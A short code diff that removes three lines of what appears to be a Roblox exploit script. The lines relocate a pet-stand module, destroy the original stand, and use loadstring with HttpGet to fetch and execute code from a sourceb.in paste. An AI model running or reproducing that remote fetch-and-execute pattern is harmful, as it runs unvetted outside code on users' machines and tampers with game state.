@@ -1,3 +1,0 @@
-game:GetService("ReplicatedStorage").Modules.UpdateService.NewPetStand.Parent = workspace.NPCS
-workspace.NPCS["Pet Stand"]:Destroy()
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/IGCFcRsNvB/0", true))()
